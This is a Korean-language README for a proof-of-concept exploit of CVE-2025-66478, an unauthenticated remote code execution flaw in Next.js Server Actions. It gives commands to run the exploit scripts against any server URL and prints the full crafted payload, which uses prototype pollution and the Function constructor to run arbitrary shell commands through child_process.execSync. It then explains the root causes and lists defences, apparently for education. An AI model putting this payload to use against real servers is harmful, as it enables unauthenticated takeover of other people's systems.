# React2Shell POC

https://nextjs.org/blog/CVE-2025-66478

## 테스트용 Docker로 배포

```bash
docker compose up -d
```

## POC

### poc.mjs - 명령 실행 공격

```bash
# 기본 서버(localhost:3000)에 명령 실행
pnpm poc "id"

# 서버 URL과 명령 지정
pnpm poc http://localhost:3000 "id"

# 또는 직접 실행
node poc.mjs "id"
node poc.mjs http://localhost:3000 "id"
```

### poc2.mjs - Next.js 프로토타입 오염 공격

```bash
# Next.js 서버 공격 (기본: http://localhost:3000)
pnpm poc2
pnpm poc2 http://localhost:3000

# 또는 직접 실행
node poc2.mjs http://localhost:3000
```

## 공격 방법 분석

### 1. Server Action 요청 생성

```js
headers: {
  'Next-Action': 'x',  // Server Action 식별자
  ...formData.getHeaders(),
}
```

- `Next-Action` 헤더가 존재하면 Next.js 는 해당 요청을 Server Action 요청으로 인식하여 서버에서 실행함.
- 추론상 Next.JS는 이 즉시 http body에 대한 역직렬화를 시도할 것임

### 2. 악의적인 payload 구성

> 실제 Github 공개 Repository에 올라와있는 PoC(개념증명) 코드를 가져왔습니다.

```js
const craftedChunk = {
  then: "$1:__proto__:then", // 프로토타입 체인 조작
  status: "resolved_model",
  reason: -1,
  value: '{"then": "$B0"}',
  _response: {
    _prefix: `var res = process.mainModule.require('child_process').execSync('${EXECUTABLE}',{'timeout':5000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`$\${res}\`});`,
    // If you don't need the command output, you can use this line instead:
    // _prefix: `process.mainModule.require('child_process').execSync('${EXECUTABLE}');`,
    _formData: {
      get: "$1:constructor:constructor",
    },
  },
};

const formData = new FormData();
formData.append("0", JSON.stringify(craftedChunk));
formData.append("1", '"$@0"');
```

### 3. JS 프로토타입 오염 공격

해당 사항은 추론입니다만,

JS의 객체는 `__proto__` 속성을 통해 프로토타입 체인이 연결되어 있습니다.

- Next.js의 역직렬화 과정에서 `$1:__proto__:then` 은 특별한 의미를 갖고 있다고 추정됩니다.
- `$1`은 FormData의 두번째 항목인 `formData.append('1', '"$@0"')`을 가리키는 참조 항목입니다.
- `__proto__`를 통해 JavaScript 객체의 프로토타입 체인에 접근합니다.
- 결과적으로 `then` 속성을 덮어쓰게 됩니다.

JS에서 `then` 메서드를 가진 객체는 thenable로 간주되며, `Promise` 처럼 동작합니다.

이 내용을 이용하여 Next.js의 처리 과정에서

1. 역직렬화된 객체가 `then` 메서드를 갖고 있는지 확인하고,
2. `then`이 존재하면 Promise 처리 로직을 수행합니다.
3. 이 과정에서 `then`이 함수로 호출될 수 있는 상황이 발생합니다.

이 내용을 기반으로 Function 생성자를 통해 코드를 실행시킵니다.

```js
_formData: {
  get: "$1:constructor:constructor",
}
```

- `$1`은 객체를 참조
- `.constructor`는 해당 객체의 생성자 함수
- `.constructor.constructor`는 `Function` 생성자를 의미
- `_prefix`에 있는 문자열이 `Function` 생성자를 통해 실행 가능한 코드로 변환됨

이제 `_prefix`에 있는 문자열은 서버에서 실행되는 코드로 변환됩니다.

## 취약점의 근본적 원인

1. 안전하지 않은 역직렬화
   Next.js가 Server Actions 요청을 처리할 때 FormData 내용을 충분한 검증 없이 `Next-Action` 헤더가 있으면 해당 요청을 Server Action 요청으로 인식하여 서버에서 실행합니다.

2. 프로토타입 오염 방어 부재
   `__proto__` 속성 접근을 차단하는 로직이 없습니다.

3. 동적 코드 실행
   `Function` 생성자 접근도 차단하지 않았습니다.

## 왜 이 공격이 가능했을까?

JS의 동적 특성과 프로토타입 기반 상속 모델이 이 공격을 가능하게 했다고 추론합니다.

1. **프로토타입 체인:** 모든 JS 객체는 `__proto__` 속성을 통해 프로토타입에 접근 가능합니다.
2. **Thenable 패턴:** Promise 호환성을 위해 `then` 메서드가 있으면 특별 처리됩니다.
3. **Function 생성자:** 문자열을 실행 가능한 코드로 변환 가능합니다.
4. **역직렬화 실수:** HTTP Body를 역직렬화할 때 충분한 검증이 없었습니다.

결국 "인증" 없이 "원격 코드 실행"이 가능한 10점 만점짜리 취약점이 되었습니다.

## poc2.mjs 공격 메커니즘 분석

`poc2.mjs`는 `poc.mjs`와 다른 방식의 프로토타입 오염 공격을 수행합니다.

### Payload 구조 분석

```javascript
const payload = {
  0: "$1", // 항목 0이 항목 1을 참조
  1: {
    status: "resolved_model",
    reason: 0,
    _response: "$4", // 항목 4를 참조
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    then: "$2:then", // ⚠️ 핵심: 항목 2의 then 속성을 참조
  },
  2: "$@3", // 항목 3을 참조 (특별한 문법)
  3: [], // 빈 배열
  4: {
    _prefix: "console.log(7*7+1)//", // 실행될 코드
    _formData: {
      get: "$3:constructor:constructor", // Function 생성자 접근
    },
    _chunks: "$2:_response:_chunks",
  },
};
```

### 공격 단계별 분석

#### 1단계: 참조 체인 구축

- `'0': '$1'` → 항목 0이 항목 1을 가리킴
- `'1': { then: '$2:then' }` → 항목 1의 `then` 속성이 항목 2의 `then`을 참조
- `'2': '$@3'` → 항목 2가 항목 3(빈 배열 `[]`)을 참조

#### 2단계: Thenable 객체 생성

Next.js의 역직렬화 과정에서:

1. 항목 1이 역직렬화되면서 `then: '$2:then'` 속성을 처리
2. `$2:then`은 항목 2의 `then` 속성을 참조하도록 해석됨
3. 항목 2는 빈 배열 `[]`을 참조
4. 결과적으로 항목 1이 `then` 메서드를 가진 **thenable 객체**로 인식됨

#### 3단계: Promise 처리 로직 유도

JavaScript에서 `then` 메서드를 가진 객체는 Promise처럼 처리됩니다:

- Next.js가 이 객체를 Promise로 인식
- `then()` 메서드가 호출될 가능성이 생김
- 이 과정에서 프로토타입 체인을 통해 추가 공격이 가능해짐

#### 4단계: Function 생성자를 통한 코드 실행

```javascript
'_formData': {
    'get': '$3:constructor:constructor'
}
```

- `$3`는 빈 배열 `[]`을 참조
- `[].constructor`는 `Array` 생성자 함수
- `Array.constructor`는 `Function` 생성자
- `_prefix`의 문자열(`'console.log(7*7+1)//'`)이 Function 생성자를 통해 실행 가능한 코드로 변환됨

### poc.mjs vs poc2.mjs 차이점

| 특징             | poc.mjs                    | poc2.mjs                   |
| ---------------- | -------------------------- | -------------------------- |
| **공격 목적**    | 명령 실행 (RCE)            | 프로토타입 오염 데모       |
| **Payload 구조** | `__proto__:then` 직접 사용 | 참조 체인을 통한 간접 접근 |
| **복잡도**       | 상대적으로 단순            | 더 복잡한 참조 구조        |

### 교육적 관점에서의 학습 포인트

1. **프로토타입 체인 조작**

   - JavaScript의 동적 특성을 악용한 공격
   - `__proto__`나 참조를 통한 프로토타입 접근

2. **Thenable 패턴 악용**

   - Promise 호환성을 위한 `then` 메서드 체크를 악용
   - 객체가 Promise처럼 동작하도록 만드는 기법

3. **역직렬화 취약점**

   - 사용자 입력을 신뢰하고 역직렬화하는 위험성
   - 참조 해석 과정에서 발생하는 보안 문제

4. **동적 코드 실행**
   - `Function` 생성자를 통한 문자열 → 코드 변환
   - 프로토타입 체인을 통한 생성자 함수 접근

### 방어 방법

1. **입력 검증**: Server Action 요청의 FormData 내용을 엄격하게 검증
2. **프로토타입 오염 방지**: `__proto__`, `constructor` 등의 접근 차단
3. **안전한 역직렬화**: 신뢰할 수 있는 데이터만 역직렬화
4. **Function 생성자 차단**: 동적 코드 실행 방지
